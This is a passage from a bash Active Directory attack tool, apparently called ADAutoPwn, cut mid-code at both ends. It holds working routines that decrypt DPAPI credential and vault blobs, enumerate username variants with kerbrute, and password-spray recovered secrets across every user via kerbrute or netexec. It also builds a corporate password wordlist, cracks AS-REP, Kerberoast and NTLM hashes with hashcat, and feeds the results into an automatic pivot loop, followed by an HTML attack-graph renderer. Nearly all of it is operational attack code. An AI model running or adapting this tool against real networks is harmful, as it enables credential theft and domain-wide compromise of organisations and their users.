        [[ -n "$p" ]] && _plausible_secret "$p" || return 1
        loot "★★ DPAPI secret recovered → ${C_GREEN}${u:-?} : ${p}${C_RESET}"
        add_secret "$p" "DPAPI offline ($src)"
        [[ -n "$u" ]] && { note_cred_source "${u}:${p}" "DPAPI offline decrypt"; queue_cred "$u" "$p" ""; }
        return 0
    }

    subsection "Decrypting credential blobs"
    local blob
    while IFS= read -r blob; do
        [[ -z "$blob" ]] && continue
        for k in "${MKEYS[@]}"; do
            out=$(impacket-dpapi credential -file "$blob" -key "0x$k" 2>/dev/null)
            grep -qiE 'Username|Target' <<<"$out" || continue   # here-string: avoid pipefail+SIGPIPE
            _dpapi_ingest "$out" "$(basename "$blob")" && break
        done
    done < <(find "$dl" -type f -ipath '*credentials*' ! -iname '*.pol' 2>/dev/null)

    subsection "Decrypting vault credentials (vpol + vcrd)"
    local vpol vdir vkeys vcrd
    while IFS= read -r vpol; do
        [[ -z "$vpol" ]] && continue
        vdir=$(dirname "$vpol")
        for k in "${MKEYS[@]}"; do
            vkeys=$(impacket-dpapi vault -vpol "$vpol" -key "0x$k" 2>/dev/null | grep -oiP '0x[0-9a-f]{16,}' | head -2 | tr '\n' ' ')
            [[ -z "$vkeys" ]] && continue
            while IFS= read -r vcrd; do
                [[ -z "$vcrd" ]] && continue
                # shellcheck disable=SC2086
                out=$(impacket-dpapi vault -vcrd "$vcrd" -vpolkeys $vkeys 2>/dev/null)
                _dpapi_ingest "$out" "$(basename "$vcrd")"
            done < <(find "$vdir" -type f -iname '*.vcrd' 2>/dev/null)
            break
        done
    done < <(find "$dl" -type f -iname '*.vpol' 2>/dev/null)
}

# ===========================================================================
#  USERNAME VARIANTS  —  derive common AD naming formats and validate them
#  (kerbrute userenum only checks existence → no password attempt, no lockout)
# ===========================================================================
VARIANTS_DONE=0
phase_user_variants() {
    [[ "$VARIANTS_DONE" == "1" || -z "$DOMAIN" || "$CAP_KERBEROS" != "1" ]] && return
    { ! _kerbrute_ok || [[ ! -s "$OUTDIR/users_all.txt" ]]; } && return
    VARIANTS_DONE=1
    section "USERNAME VARIANTS · derive & validate alternate account formats"

    local vf="$OUTDIR/users_variants.txt"
    awk '
    {
      u=tolower($0); print u
      n=split(u,p,/[._-]/)
      if (n>=2) {
        f=p[1]; l=p[n]; fi=substr(f,1,1); li=substr(l,1,1)
        print f; print l
        print f"."l; print f"_"l; print f"-"l; print f l
        print fi l; print fi"."l; print l fi; print l"."f
        print f li; print l f
      }
    }' "$OUTDIR/users_all.txt" 2>/dev/null | sort -u >"$vf"
    # keep only NEW candidates not already known-valid
    comm -23 "$vf" "$OUTDIR/users_all.txt" >"${vf}.new" 2>/dev/null && mv "${vf}.new" "$vf"
    [[ ! -s "$vf" ]] && { info "No new username variants to test"; return; }

    subsection "Validating $(wc -l <"$vf") candidate usernames (kerbrute userenum)"
    run "$KERBRUTE_BIN userenum -d $DOMAIN --dc $DC_IP users_variants.txt"
    "$KERBRUTE_BIN" userenum -d "$DOMAIN" --dc "$DC_IP" "$vf" 2>&1 | tee -a "$LOGFILE" \
        | grep -i 'VALID USERNAME' | grep -oiP '\K[A-Za-z0-9._-]+(?=@)' | sort -u >"$OUTDIR/users_variants_valid.txt"
    if [[ -s "$OUTDIR/users_variants_valid.txt" ]]; then
        loot "New valid accounts via variants:"
        while read -r u; do echo -e "      ${C_GREEN}· $u${C_RESET}"; done <"$OUTDIR/users_variants_valid.txt"
        cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
    else
        info "No additional accounts discovered from variants"
    fi
}

# ===========================================================================
#  PASSWORD SPRAY  —  spray every recovered password across all known users
#  (this is what turns a single cracked file/hash into domain-wide pivots)
# ===========================================================================
# True only when KERBRUTE_BIN is a real, runnable binary (NOT a directory —
# some installs leave /opt/kerbrute as a folder, and `-x` is true on dirs).
_kerbrute_ok() { [[ -n "$KERBRUTE_BIN" && -f "$KERBRUTE_BIN" && -x "$KERBRUTE_BIN" ]]; }

# Spray a single password across all users and queue any valid hit.
# Uses kerbrute when available; otherwise falls back to netexec (always present),
# so a recovered/harvested password is ALWAYS sprayed → pivots even w/o kerbrute.
#
# NOTE: the result loops use `while … done < <(…)` (process substitution), NOT
# `… | while`. A pipe runs the loop in a SUBSHELL, so queue_cred would mutate a
# throwaway CRED_QUEUE and the new identities would never get pivoted. Keeping
# the loop in the parent shell is what makes the recursive pivot actually work.
_spray_one() {
    local pw="$1" u line
    if _kerbrute_ok; then
        while read -r u; do
            [[ -z "$u" ]] && continue
            loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
            note_cred_source "${u}:${pw}" "password spray (kerbrute)"
            queue_cred "$u" "$pw" ""
        done < <("$KERBRUTE_BIN" passwordspray -d "$DOMAIN" --dc "$DC_IP" "$OUTDIR/users_all.txt" "$pw" 2>&1 \
                   | tee -a "$LOGFILE" | grep -i 'VALID LOGIN' | grep -oiP 'VALID LOGIN:\s+\K\S+?(?=@)')
    else
        # netexec fallback: spray this one password across every user over SMB.
        # Use Kerberos (-k) + FQDN when in Kerberos mode — many DCs disable NTLM
        # (STATUS_NOT_SUPPORTED), and Kerberos spray succeeds where NTLM can't.
        local kflag=(); [[ "$KERBEROS" == "1" ]] && kflag=(-k)
        while IFS= read -r line; do
            u=$(echo "$line" | grep -oP '\\\K[^\\:]+(?=:)' | head -1)
            [[ -z "$u" ]] && continue
            loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
            note_cred_source "${u}:${pw}" "password spray (nxc)"
            echo "$line" | grep -qi 'Pwn3d' && loot "  ↳ ${u} is LOCAL ADMIN where sprayed"
            queue_cred "$u" "$pw" ""
        done < <($NXC smb "$DCT" -u "$OUTDIR/users_all.txt" -p "$pw" "${kflag[@]}" --continue-on-success 2>&1 \
                   | tee -a "$LOGFILE" | grep -iE '\[\+\]')
    fi
}

phase_password_spray() {
    [[ ! -s "$OUTDIR/users_all.txt" ]] && return
    # need a spray method: kerbrute, or netexec over SMB
    { ! _kerbrute_ok && [[ "$CAP_SMB" != "1" ]]; } && return
    # Dedup key includes the user-list size: when the list GROWS (restored /
    # re-enabled / newly-discovered accounts), every known secret is re-sprayed
    # against the larger set — so a password recovered before a user existed
    # still lands on it (e.g. restore a deleted user → spray its leaked password).
    local pw new=0 ucount; ucount=$(grep -c . "$OUTDIR/users_all.txt")
    for pw in "${!FOUND_SECRETS[@]}"; do [[ -z "${SPRAYED[${pw}@@${ucount}]:-}" ]] && new=1; done

    # 1) Spray recovered secrets (low risk: 1 attempt/user per password)
    if [[ "$new" == "1" ]]; then
        section "PASSWORD SPRAY · recovered secrets × all users"
        for pw in "${!FOUND_SECRETS[@]}"; do
            [[ -n "${SPRAYED[${pw}@@${ucount}]:-}" ]] && continue
            SPRAYED["${pw}@@${ucount}"]=1
            subsection "Spraying a recovered password against ${ucount} users ($(_kerbrute_ok && echo kerbrute || echo netexec))"
            run "spray '<secret>' × users_all.txt"
            _spray_one "$pw"
        done
    fi

    # 2) Domain-focused dictionary spray — OPT-IN (--spray): account-lockout risk
    if [[ "$SPRAY_GEN" == "1" && -s "$DOMAIN_WL" && -z "${SPRAYED[__GEN__]:-}" ]]; then
        SPRAYED[__GEN__]=1
        section "PASSWORD SPRAY · domain-focused dictionary (--spray)"
        warn "Lockout risk: each candidate = 1 bad attempt per user. Capping to the safest few."
        local cap=6 i=0
        while IFS= read -r pw && (( i < cap )); do
            [[ -z "$pw" || -n "${SPRAYED[$pw]:-}" ]] && continue
            SPRAYED["$pw"]=1; i=$((i+1))
            subsection "[$i/$cap] Spraying '$pw'"
            run "spray '$pw' × users_all.txt"
            _spray_one "$pw"
        done <"$DOMAIN_WL"
        info "Generated spray capped at $cap candidates to protect accounts (raise manually if policy allows)"
    fi
}

# ===========================================================================
#  DOMAIN-FOCUSED WORDLIST  —  high-probability candidates from the target
#  (used first for OFFLINE cracking; optionally for capped online spray)
# ===========================================================================
gen_domain_wordlist() {
    local out="$OUTDIR/domain_wordlist.txt"
    [[ -s "$out" ]] && { DOMAIN_WL="$out"; return; }
    [[ -z "$DOMAIN" ]] && return
    local short="${DOMAIN%%.*}"                       # corp.local -> corp
    local yr; yr=$(date +%Y); local pyr=$((yr-1)) ; local ppyr=$((yr-2))
    local -a bases=("$short" "${short^}" "${short^^}")
    [[ -n "$DC_HOST" ]] && bases+=("$DC_HOST" "${DC_HOST^}")
    local -a seasons=(Spring Summer Autumn Fall Winter)
    local -a suffix=("" "1" "12" "123" "1234" "!" "123!" "@123" "#1" "2024" "2025" "2026" "$yr" "$pyr" "${yr}!" "${pyr}!" "01")
    { for b in "${bases[@]}"; do for s in "${suffix[@]}"; do echo "${b}${s}"; done; done
      for se in "${seasons[@]}"; do for y in "$yr" "$pyr" "$ppyr"; do
          echo "${se}${y}"; echo "${se}${y}!"; echo "${se}@${y}"; done; done
      # Common corporate defaults
      printf '%s\n' Welcome1 Welcome1! Welcome123 Welcome123! Password1 Password1! \
          Password123 Password123! P@ssw0rd 'P@ssw0rd!' 'P@ssw0rd123' Changeme123 \
          Changeme123! Letmein123! Summer123! Company123! Admin123! Qwerty123!
    } | sort -u >"$out"
    DOMAIN_WL="$out"
    ok "Domain-focused wordlist generated → $(wc -l <"$out") candidates (domain_wordlist.txt)"
}

# ===========================================================================
#  OFFLINE CRACKING  (hashcat + wordlist)
# ===========================================================================
crack_hashes() {
    local file="$1" mode="$2" label="$3"
    [[ ! -s "$file" ]] && return

    # Cross-iteration dedup: the pivot loop re-roasts the same SPN/AS-REP accounts
    # (and re-dumps the same NTLM hashes) every pass. Cracking them again is pure
    # waste — same hash, same wordlist. Key by ACCOUNT for Kerberos hashes (the
    # encrypted blob carries a fresh nonce each request, so the hash STRING differs
    # even though the account/password don't), and by the hash line for NTLM.
    local work line k; work="$(mktemp)"
    while IFS= read -r line; do
        [[ -z "$line" ]] && continue
        case "$label" in
            AS-REP)     k=$(grep -oP '\$krb5asrep\$[0-9]+\$\K[^@:]+' <<<"$line" | head -1) ;;
            Kerberoast) k=$(grep -oP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+'  <<<"$line" | head -1) ;;
            *)          k="$line" ;;
        esac
        [[ -z "$k" ]] && k="$line"
        k="${label}::${k}"
        [[ -n "${TRIED_HASHES[$k]:-}" ]] && continue
        TRIED_HASHES["$k"]=1
        printf '%s\n' "$line" >>"$work"
    done <"$file"
    if [[ ! -s "$work" ]]; then
        rm -f "$work"
        info "$label hashes already cracked/attempted in an earlier pass → skipping re-crack"
        return
    fi

    subsection "Cracking $label (hashcat -m $mode)"
    # 1) domain-focused candidates first (fast, high hit-rate), then rockyou
    if [[ -s "$DOMAIN_WL" ]]; then
        run "hashcat -m $mode <file> domain_wordlist.txt -O"
        hashcat -m "$mode" "$work" "$DOMAIN_WL" -O 2>&1 | tee -a "$LOGFILE"
    fi
    if [[ -f "$WORDLIST" ]]; then
        run "hashcat -m $mode <file> $WORDLIST -O"
        hashcat -m "$mode" "$work" "$WORDLIST" -O 2>&1 | tee -a "$LOGFILE"
    elif [[ ! -s "$DOMAIN_WL" ]]; then
        warn "No wordlist available, skipping $label cracking"; rm -f "$work"; return
    fi
    local cracked; cracked=$(hashcat -m "$mode" "$work" --show 2>/dev/null); rm -f "$work"
    if [[ -n "$cracked" ]]; then
        loot "★★★ CRACKED CREDENTIALS ($label) ★★★"
        echo "$cracked" | while IFS= read -r line; do echo -e "      ${C_GREEN}${C_BOLD}$line${C_RESET}"; done
        echo "$cracked" >>"$OUTDIR/cracked_passwords.txt"
        # Feed cracked plaintext back into the pivot queue (user:password)
        while IFS= read -r line; do
            local pw user
            pw="${line##*:}"
            add_secret "$pw" "cracked $label hash"
            case "$label" in
                AS-REP)     user=$(echo "$line" | grep -oP '\$krb5asrep\$[0-9]+\$\K[^@]+') ;;
                Kerberoast) user=$(echo "$line" | grep -oP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+') ;;
                NTLM)       # map NT hash back to a username via the DCSync output
                    local nt="${line%%:*}"
                    user=$(grep -iE ":${nt}:::" "$OUTDIR/secretsdump.txt" 2>/dev/null | head -1 | cut -d: -f1) ;;
            esac
            [[ -n "$user" && -n "$pw" ]] && queue_cred "$user" "$pw" ""
        done <<<"$cracked"
    else
        info "Nothing cracked for $label with this wordlist"
    fi
}

# ===========================================================================
#  BLOODHOUND → INTERACTIVE GRAPH  (self-contained, offline graph.html)
#  Parses the collected BloodHound zip, builds nodes/edges, highlights attack
#  paths to Domain Admins / DC, and embeds ready-to-run Linux+Windows abuse
#  commands for every exploitable ACL edge — like BloodHound, but prettier.
# ===========================================================================
# Core renderer: reads env BH_ZIP / BH_HTML / OWNED_FILE / GDOMAIN / GDC and
# writes a self-contained graph.html. Shared by the full run and --graph mode.
render_graph_py() {
    python3 - <<'PYEOF'
import os, sys, json, zipfile
from collections import defaultdict, deque

ZIP   = os.environ.get("BH_ZIP","")
HTML  = os.environ.get("BH_HTML","graph.html")
OWNED = os.environ.get("OWNED_FILE","")
DOM   = (os.environ.get("GDOMAIN","domain.local") or "domain.local")
DC    = (os.environ.get("GDC","") or DOM)          # DC DNS name (for -target/-dc-host/--host)
DCIP  = (os.environ.get("GDCIP","") or DC)          # DC IP (for -dc-ip); falls back to the name

HTML_TEMPLATE = r'''<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ADAutoPwn · Attack Graph</title>
<style>
  :root{
    --user:#4ea1ff; --group:#ffca3a; --computer:#ff6b6b; --domain:#36d399;
    --gpo:#b794f6; --ou:#7dd3fc; --base:#94a3b8;
    --path:#ff2d6d; --gold:#ffd24a; --owned:#ff3b3b;
    --bg0:#0a0e16; --bg1:#11161f; --ink:#e6edf3; --muted:#9aa7b8;
    --glass:rgba(20,26,38,.72); --line:rgba(255,255,255,.08);
  }
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;overflow:hidden;font-family:"Inter",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
    color:var(--ink);background:
      radial-gradient(1200px 800px at 78% -10%,rgba(54,211,153,.10),transparent 60%),
      radial-gradient(1000px 700px at -10% 110%,rgba(78,161,255,.12),transparent 55%),
      linear-gradient(160deg,var(--bg0),var(--bg1));}
  #c{position:fixed;inset:0;display:block;cursor:grab}
  #c.grab{cursor:grabbing}
  .glass{background:var(--glass);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
    border:1px solid var(--line);border-radius:16px;
    box-shadow:0 10px 40px rgba(0,0,0,.45),inset 0 1px 0 rgba(255,255,255,.05)}
  #header{position:fixed;top:18px;left:20px;padding:14px 18px;z-index:5}
  #header h1{font-size:17px;font-weight:800;letter-spacing:.3px;
    background:linear-gradient(90deg,#fff,#9fe7ff 40%,#7dffc4);-webkit-background-clip:text;background-clip:text;color:transparent}
  #header .sub{font-size:11px;color:var(--muted);margin-top:3px;letter-spacing:.4px}
  #header .sub b{color:#cfe8ff;font-weight:600}
  #search{position:fixed;top:18px;right:20px;z-index:5;display:flex;gap:8px;align-items:center;padding:8px 10px}
  #search input{background:rgba(0,0,0,.35);border:1px solid var(--line);border-radius:10px;color:var(--ink);
    padding:8px 12px;font-size:13px;width:220px;outline:none;transition:.2s}
  #search input:focus{border-color:rgba(125,255,196,.5);box-shadow:0 0 0 3px rgba(125,255,196,.12)}
  #search .ico{font-size:13px;color:var(--muted)}
  #search #reset{cursor:pointer;color:var(--muted);font-size:16px;padding:2px 7px;border-radius:8px;transition:.15s;user-select:none}
  #search #reset:hover{background:rgba(255,255,255,.08);color:#7dffc4}
  #results{position:fixed;top:62px;right:20px;z-index:6;width:262px;max-height:320px;overflow-y:auto;display:none;
    background:var(--glass);backdrop-filter:blur(14px);border:1px solid var(--line);border-radius:12px;box-shadow:0 10px 40px rgba(0,0,0,.45)}
  #results.show{display:block}
  #results .r{padding:8px 12px;font-size:12.5px;cursor:pointer;border-bottom:1px solid rgba(255,255,255,.04);display:flex;align-items:center;gap:8px}
  #results .r:hover,#results .r.sel{background:rgba(125,255,196,.10)}
  #results .r .d{width:9px;height:9px;border-radius:50%;flex:0 0 auto;box-shadow:0 0 8px currentColor}
  #results .r small{color:var(--muted);margin-left:auto}
  #dock{position:fixed;top:120px;left:20px;z-index:5;display:flex;flex-direction:column;gap:6px;max-width:210px}
  #dock .qlabel{font-size:9.5px;letter-spacing:1.6px;color:#5b6677;margin:8px 2px 1px;font-weight:700}
  .tab.active{border-color:rgba(255,210,74,.7);color:#ffd24a;background:rgba(255,210,74,.08)}
  .tab{cursor:pointer;font-family:inherit;font-size:12px;font-weight:600;color:var(--ink);text-align:left;
    background:var(--glass);backdrop-filter:blur(14px);border:1px solid var(--line);border-radius:11px;padding:9px 13px;
    box-shadow:0 8px 26px rgba(0,0,0,.4);transition:.15s}
  .tab:hover{border-color:rgba(125,255,196,.45);color:#9bf3cf}
  .tab.on{border-color:rgba(255,45,109,.6);color:#ff8fb0}
  #findings{position:fixed;top:120px;left:170px;z-index:6;width:340px;max-height:calc(100% - 150px);
    display:none;flex-direction:column;overflow:hidden}
  #findings.show{display:flex}
  #findings .fhead{display:flex;align-items:center;justify-content:space-between;padding:13px 15px;border-bottom:1px solid var(--line);font-weight:700;font-size:13px}
  #findings .fx{cursor:pointer;color:var(--muted);font-size:18px;line-height:1}
  #findings .fx:hover{color:#fff}
  #findings #ffilter{margin:10px 12px;background:rgba(0,0,0,.35);border:1px solid var(--line);border-radius:9px;color:var(--ink);padding:7px 11px;font-size:12px;outline:none}
  #findings .flist{overflow-y:auto;padding:0 8px 12px}
  #findings .fi{padding:9px 11px;border-radius:9px;cursor:pointer;font-size:12px;margin:3px 0;border:1px solid transparent;transition:.12s}
  #findings .fi:hover{background:rgba(255,255,255,.05);border-color:var(--line)}
  #findings .fi .rt{color:#ff8fb0;font-weight:700}
  #findings .fi .src{color:#cfe8ff}.fi .dst{color:#ffd24a}
  #findings .fg{font-size:10px;letter-spacing:1px;text-transform:uppercase;color:#7dffc4;margin:12px 6px 4px;font-weight:700}
  #findings .flist::-webkit-scrollbar{width:8px}#findings .flist::-webkit-scrollbar-thumb{background:rgba(255,255,255,.12);border-radius:8px}
  #legend{position:fixed;bottom:18px;left:20px;z-index:5;padding:12px 14px;font-size:12px}
  #legend .row{display:flex;align-items:center;gap:8px;margin:5px 0;color:var(--muted)}
  #legend .dot{width:11px;height:11px;border-radius:50%;box-shadow:0 0 10px currentColor}
  #legend .ln{width:18px;height:0;border-top:3px solid var(--path);box-shadow:0 0 8px var(--path)}
  #hint{position:fixed;bottom:18px;right:20px;z-index:5;font-size:11px;color:var(--muted);
    padding:9px 12px;letter-spacing:.3px}
  #tip{position:fixed;z-index:9;pointer-events:none;padding:6px 10px;border-radius:8px;font-size:12px;
    background:rgba(8,11,18,.92);border:1px solid var(--line);color:#e8f0fb;display:none;max-width:280px}
  #panel{position:fixed;top:0;right:0;height:100%;width:380px;z-index:8;transform:translateX(105%);
    transition:transform .32s cubic-bezier(.22,1,.36,1);display:flex;flex-direction:column;
    border-radius:18px 0 0 18px;overflow:hidden}
  #panel.open{transform:translateX(0)}
  #panel .head{padding:20px 20px 14px;border-bottom:1px solid var(--line);position:relative}
  #panel .ptype{font-size:11px;letter-spacing:1.5px;text-transform:uppercase;color:var(--muted)}
  #panel .pname{font-size:18px;font-weight:800;margin-top:5px;word-break:break-all;line-height:1.3}
  #panel .badges{margin-top:10px;display:flex;gap:7px;flex-wrap:wrap}
  .badge{font-size:10px;font-weight:700;letter-spacing:.4px;padding:4px 9px;border-radius:999px;border:1px solid var(--line)}
  .badge.hv{color:#1a1300;background:linear-gradient(90deg,#ffe08a,#ffc107);border:none}
  .badge.owned{color:#fff;background:linear-gradient(90deg,#ff5b5b,#c81e1e);border:none}
  .badge.t{color:var(--ink);background:rgba(255,255,255,.06)}
  .badge.own-toggle{cursor:pointer;color:#ff9db0;border-color:rgba(255,59,59,.5);user-select:none}
  .badge.own-toggle:hover{background:rgba(255,59,59,.15);color:#fff}
  #panel .close{position:absolute;top:16px;right:16px;cursor:pointer;color:var(--muted);font-size:20px;
    width:30px;height:30px;line-height:28px;text-align:center;border-radius:8px;transition:.15s}
  #panel .close:hover{background:rgba(255,255,255,.08);color:#fff}
  #panel .body{padding:16px 18px 30px;overflow-y:auto;flex:1}
  #panel .body::-webkit-scrollbar{width:8px}#panel .body::-webkit-scrollbar-thumb{background:rgba(255,255,255,.12);border-radius:8px}
  .sect{font-size:11px;letter-spacing:1.2px;text-transform:uppercase;color:#7dffc4;margin:18px 0 9px;font-weight:700}
  .stat{display:flex;justify-content:space-between;font-size:12.5px;color:var(--muted);padding:3px 0}
  .stat b{color:var(--ink);font-weight:600}
  .edge{font-size:12px;color:var(--muted);padding:4px 0;display:flex;gap:7px;align-items:center}
  .edge .rt{color:#ffd24a;font-weight:600}
  .abuse{border:1px solid var(--line);border-radius:12px;margin:11px 0;overflow:hidden;background:rgba(0,0,0,.22)}
  .abuse .ah{padding:10px 12px;font-size:12.5px;display:flex;align-items:center;gap:8px;flex-wrap:wrap;
    background:linear-gradient(90deg,rgba(255,45,109,.16),transparent)}
  .abuse .ah .arrow{color:var(--path);font-weight:800}
  .abuse .ah .src{color:#cfe8ff;font-weight:700}.abuse .ah .dst{color:#ffd24a;font-weight:700}
  .cmd{border-top:1px solid var(--line)}
  .cmd .ch{display:flex;align-items:center;gap:8px;padding:8px 12px 4px;font-size:11px;color:var(--muted)}
  .os{font-size:9.5px;font-weight:800;letter-spacing:.5px;padding:2px 7px;border-radius:6px}
  .os.linux{background:rgba(78,161,255,.18);color:#9fcbff}
  .os.win{background:rgba(125,255,196,.16);color:#9bf3cf}
  .cmd pre{margin:0;padding:6px 12px 12px;font-family:"JetBrains Mono",ui-monospace,Menlo,Consolas,monospace;
    font-size:11.5px;line-height:1.55;color:#e8f0fb;white-space:pre-wrap;word-break:break-all;cursor:pointer;position:relative}
  .cmd pre:hover{color:#fff}
  .cmd .cp{float:right;font-size:9.5px;color:var(--muted);border:1px solid var(--line);border-radius:6px;padding:1px 6px;margin-left:8px}
  .empty{color:var(--muted);font-size:12.5px;font-style:italic;padding:8px 0}
  .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(20px);z-index:20;
    padding:9px 16px;border-radius:10px;font-size:12.5px;background:rgba(20,28,40,.95);border:1px solid var(--line);
    color:#9bf3cf;opacity:0;transition:.25s;pointer-events:none}
  .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
</style>
</head>
<body>
<canvas id="c"></canvas>
<div id="empty" style="position:fixed;inset:0;z-index:1;display:flex;align-items:center;justify-content:center;pointer-events:none">
  <div style="text-align:center;max-width:520px;padding:26px 30px;color:#9aa7b8;line-height:1.7">
    <div style="font-size:30px;margin-bottom:10px">&#128375;&#65039;</div>
    <div style="font-size:15px;color:#cfe8ff;font-weight:600;margin-bottom:8px">The graph starts empty — you drive it</div>
    <div style="font-size:13px">
      &#128269; <b style="color:#dbe6f3">Search</b> a user/computer, or pick a <b style="color:#dbe6f3">VIEW</b> on the left.<br>
      Click a node to expand what hangs off it.<br>
      <span style="color:#ff8a8a">&#9760; Right-click a node (or press <b>O</b>) to mark it owned</span> — then
      <b style="color:#ffd24a">&rarr; Domain Admins</b> / <b style="color:#ffd24a">&rarr; DC</b> map your paths.
    </div>
  </div>
</div>
<div id="header" class="glass">
  <h1>ADAutoPwn · Attack Graph</h1>
  <div class="sub" id="meta"></div>
  <div class="sub" id="count" style="color:#7dffc4"></div>
</div>
<div id="search" class="glass">
  <span class="ico">&#128269;</span>
  <input id="q" placeholder="Search any node…" autocomplete="off" spellcheck="false">
  <span id="reset" title="Reset to attack-path view">&#8635;</span>
</div>
<div id="results"></div>

<div id="dock">
  <div class="qlabel">VIEW</div>
  <button class="tab q" data-q="owned" title="What you control">&#9760; Owned</button>
  <button class="tab q" data-q="da"    title="Shortest paths from owned to Domain Admins">&#128081; &rarr; Domain Admins</button>
  <button class="tab q" data-q="dc"    title="Shortest paths from owned to a Domain Controller">&#128421;&#65039; &rarr; DC</button>
  <button class="tab q" data-q="hv"    title="High-value targets">&#11088; High value</button>
  <button class="tab q" data-q="all"   title="Everything (can be busy)">&#128301; Everything</button>
  <div class="qlabel">LIST</div>
  <button id="btnFind" class="tab" title="Who can abuse what">&#9876; Abusable ACLs</button>
  <button id="btnUsers" class="tab" title="All users">&#128100; Users</button>
</div>
<div id="findings" class="glass">
  <div class="fhead"><span id="findTitle">Attack paths</span><span class="fx" id="findClose">&times;</span></div>
  <input id="ffilter" placeholder="filter…" autocomplete="off" spellcheck="false">
  <div class="flist" id="flist"></div>
</div>

<div id="legend" class="glass">
  <div class="row"><span class="dot" style="color:var(--user)"></span>User</div>
  <div class="row"><span class="dot" style="color:var(--group)"></span>Group</div>
  <div class="row"><span class="dot" style="color:var(--computer)"></span>Computer</div>
  <div class="row"><span class="dot" style="color:var(--domain)"></span>Domain</div>
  <div class="row"><span class="ln"></span>Attack path → DA / DC</div>
  <div class="row"><span style="color:var(--gold)">&#9733;</span>High value &nbsp; <span style="color:var(--owned)">&#9760;</span>Owned</div>
</div>
<div id="hint" class="glass">scroll = zoom · drag = move · click = expand · right-click / O = mark owned · search = find anything</div>
<div id="tip"></div>
<div id="panel" class="glass">
  <div class="head">
    <div class="close" id="pclose">&times;</div>
    <div class="ptype" id="ptype"></div>
    <div class="pname" id="pname"></div>
    <div class="badges" id="pbadges"></div>
  </div>
  <div class="body" id="pbody"></div>
</div>
<div class="toast" id="toast">copied</div>
<script>
const DATA   = __DATA__;
const ABUSE  = __ABUSE__;
const DOMAIN = __DOMAIN__;
const DCHOST = __DC__;
const DCIP   = __DCIP__;
const META   = __META__;

const COLORS={User:"#4ea1ff",Group:"#ffca3a",Computer:"#ff6b6b",Domain:"#36d399",
  GPO:"#b794f6",OU:"#7dd3fc",Container:"#7dd3fc",Base:"#94a3b8"};
const N=DATA.nodes, E=DATA.edges;
document.getElementById("meta").innerHTML = META.replace(/·/g,"&middot;");

// adjacency over ALL nodes (data stays complete so search can reach anything)
const nb=N.map(()=>new Set());
const incE=N.map(()=>[]);                 // incident edge indices per node
E.forEach((e,i)=>{nb[e.s].add(e.t);nb[e.t].add(e.s);incE[e.s].push(i);incE[e.t].push(i);});
const deg=N.map((_,i)=>incE[i].length);
N.forEach((n,i)=>{n._i=i; n.r=(n.type==="Domain"?14:n.hv?10:7)+Math.min(deg[i]*0.22,5);
  const a=Math.random()*6.28, rad=120+Math.random()*240;
  n.x=Math.cos(a)*rad; n.y=Math.sin(a)*rad; n.vx=0; n.vy=0;});

// Directed adjacency (s → t) for shortest-path queries, like BloodHound.
const outAdj=N.map(()=>[]), inAdj=N.map(()=>[]);
E.forEach((e,i)=>{ outAdj[e.s].push([e.t,i]); inAdj[e.t].push([e.s,i]); });
// owned is mutable: the operator marks/unmarks nodes live in the graph
// (right-click a node, press "o", or use the panel button). Any --owned seed
// from the scan just pre-fills it; it is NOT required.
let ownedIdx=[...N.keys()].filter(i=>N[i].owned);
function recomputeOwned(){ ownedIdx=[...N.keys()].filter(i=>N[i].owned); }
const hvIdx=[...N.keys()].filter(i=>N[i].hv);
const _U=s=>(s||"").toUpperCase();
const _dcShort=_U(DCHOST).split(".")[0];
const daSet=new Set([...N.keys()].filter(i=>N[i].type!=="User" &&
  ["DOMAIN ADMINS","ENTERPRISE ADMINS","ADMINISTRATORS","SCHEMA ADMINS"].some(w=>_U(N[i].label).includes(w))));
const dcSet=new Set([...N.keys()].filter(i=>
  _U(N[i].label).includes("DOMAIN CONTROLLERS") ||
  (N[i].type==="Computer" && (N[i].hv || (_dcShort && _U(N[i].label).startsWith(_dcShort))))));
const PATHSET=new Set();   // edge indices on the currently-displayed attack path

// shortest paths from owned nodes to a target set (union); fall back to the
// targets + their direct attackers when nothing is owned yet.
function pathsTo(targets){
  const nodes=new Set(), edges=new Set();
  if(!ownedIdx.length){ targets.forEach(t=>{ nodes.add(t);
    inAdj[t].forEach(([s,ei])=>{ nodes.add(s); edges.add(ei); }); }); return {nodes,edges}; }
  ownedIdx.forEach(start=>{
    const prev=new Map([[start,-1]]), pe=new Map(); const q=[start]; let hit=-1;
    for(let h=0; h<q.length && hit<0; h++){ const u=q[h];
      if(targets.has(u) && u!==start){ hit=u; break; }
      for(const [v,ei] of outAdj[u]) if(!prev.has(v)){ prev.set(v,u); pe.set(v,ei); q.push(v); } }
    if(hit>=0){ let nd=hit; nodes.add(nd);
      while(prev.get(nd)!==-1){ edges.add(pe.get(nd)); nd=prev.get(nd); nodes.add(nd); } }
  });
  ownedIdx.forEach(i=>nodes.add(i));
  return {nodes,edges};
}

// ---- VISIBLE SET: BloodHound-style. Start tiny (just what you own) and let
// the operator pick a VIEW (→ Domain Admins, → DC, High value) or search/expand.
const vis=new Set();
let visArr=[], VE=[], curView="owned";
function refresh(){ visArr=[...vis]; const s=new Set();
  visArr.forEach(i=>incE[i].forEach(ei=>{const e=E[ei]; if(vis.has(e.s)&&vis.has(e.t))s.add(ei);}));
  VE=[...s]; updateCount(); if(typeof updateHint==="function") updateHint(); }
function expand(i){ vis.add(i); nb[i].forEach(j=>vis.add(j)); refresh(); reheat(); }

// Switch the displayed query/view. Reseeds positions for a clean layout.
function applyView(q){
  curView=q; vis.clear(); PATHSET.clear();
  if(q==="none"){ /* deliberately empty — the boot state */ }
  else if(q==="owned"){ ownedIdx.forEach(i=>{ vis.add(i); nb[i].forEach(j=>vis.add(j)); }); }
  else if(q==="hv"){ hvIdx.forEach(i=>vis.add(i)); }
  else if(q==="all"){ N.forEach((_,i)=>vis.add(i)); }
